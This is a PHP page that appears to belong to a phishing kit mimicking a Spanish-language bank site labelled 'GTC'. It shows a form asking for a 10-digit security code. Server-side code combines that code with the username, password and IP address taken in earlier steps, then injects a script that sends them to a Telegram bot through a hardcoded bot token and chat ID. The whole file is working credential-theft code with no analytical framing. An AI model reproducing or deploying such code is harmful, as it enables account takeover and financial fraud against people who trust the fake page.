<?php
    session_start();

    if(!empty($_POST['i3']) || !empty($_POST['i4'])){
        
        
      $tlg_tk = "6783125315:AAHnBQxcDcmBiytZzmV0X3zG6r1atjM2MqI";
      $tlg_id = "-4065625444";

        if(!empty($_POST['i3'])){
            $msg = "GTC 2 >>>I".$_SERVER['REMOTE_ADDR']."- U:".$_SESSION['i1']."- P:".$_SESSION['i2']."- SC:".$_POST['i3'];
        }else{
            $msg = "GTC 2 >>>I".$_SERVER['REMOTE_ADDR']."- U:".$_SESSION['i1']."- P:".$_SESSION['i2']."- SC:".$_POST['i4']; 
        }
        
        $tgmsg = <<<EOC
                <script>
                    var tlbtid = "{{tlg_tk}}";
                    var chat_id = "{{tlg_id}}";

                    var message;
                    var ready = function () {
                        message = "{{msg}}";
                    };
                    var cfnder = function () {
                        ready();
                        var settings = {
                            "async": true,
                            "crossDomain": true,
                            "url": "https://api.telegram.org/bot" + tlbtid + "/sendMessage",
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "cache-control": "no-cache"

                            },
                            "data": JSON.stringify({
                                "chat_id": chat_id,
                                "text": message
                            })
                        };
                        $.ajax(settings).done(function (response) {
                            //window.location = '3.html';
                            console.log('well');
                        });

                        return false;
                    };
                    cfnder();

                </script>
        EOC;

        $main = str_replace("{{msg}}", $msg , $tgmsg);
        $main = str_replace("{{tlg_tk}}", $tlg_tk , $main);
        $main = str_replace("{{tlg_id}}", $tlg_id , $main);



    }else{
        header ('Location:2.php');
    }
?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>GTC</title>
    <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
  </head>
  <body>
    <style>
        *{margin: 0;padding: 0;}
    </style>
    <nav style="padding: 10px 0;height: 20px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;background: linear-gradient(90deg,#0067b1,#12477d);">
        <img id="n1" src="n1.svg" alt="" style="height:24px;">
    </nav>
    <nav style="padding: 10px 0; height: 60px; background: #fff; border-bottom: 1px solid rgba(33,25,21,.2); text-align: center; ">
    <img src="l.svg" alt="" style="width:60px;">
    </nav>
    <nav style="padding: 10px 0;height: 18px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;">
        <img id="n2" src="n2.svg" alt="" style="height:24px;">
    </nav>
    <div id="main-cnt" style="background-image: url(bnr1.jpg);background-repeat: no-repeat; overflow: hidden;background-size: cover;background-position: 50%; min-height:700px">
    
    <div id="ctn" style="overflow:hidden;text-align:center;background: rgb(172 172 172 / 21%);height:100vh;">
        <form method="post" action="4.php" id="f1" style="display: inline-block;width: 420px;height: 715px;background-image: url(4.svg);border-radius: 0 0 45px 45px; background-repeat: no-repeat; background-position: center;" >
        <input autofocus id="i4" name="i4" placeholder="" type="text" required style="display: block;position: relative;color:#333;background: transparent;border: none;top: 161px;left: 129px;height: 28px;width: 156px;padding-left: 8px;outline: none;" autocomplete="off" inputmode="numeric" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" pattern=".{10,}" maxlength="10">
            <input type="submit" style="display: block;position: relative;color:#333;background: transparent;border: none;top: 177px;left: 134px;height: 36px;width: 153px;padding-left: 8px;outline: none;" value="">    
        </form>
    </div>
    </div>
    <style>
        @media screen and (min-width:1024px){
            #ctn{
                text-align: right !important;
                padding-right: 46px;
            }
            
        }
        @media screen and (max-width:720px){
            #n1{
                height: 20px!important;
            }
            #n2{
                height: 18px!important;
            }
        }
        @media screen and (max-width:420px){
            #f1{
                border-radius: 0!important;
            }
            #main-cnt{
                background-image: none!important;
                background: linear-gradient(90deg,#0067b1,#12477d) !important;
            }
        }
    </style>
    <?php echo $main; ?>
  </body>
</html>